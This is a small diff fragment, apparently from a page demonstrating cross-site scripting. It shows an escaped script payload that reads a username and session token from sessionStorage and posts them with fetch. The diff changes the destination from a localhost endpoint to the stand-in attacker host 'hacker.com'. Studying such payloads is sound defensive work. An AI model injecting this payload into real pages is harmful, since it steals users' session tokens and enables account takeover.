@@ -38,7 +38,7 @@
         const username = sessionStorage.getItem('username');<br/>
         const token = sessionStorage.getItem('token');<br/>
         console.log(username, token);<br/>
-        fetch('http://localhost:8080/startXSS',{<br/>
+        fetch('http://hacker.com',{<br/>
         method: 'post',<br/>
         body:JSON.stringify({username,token})});&lt;/script&gt;&lt;p&gt;</span>
       </div>
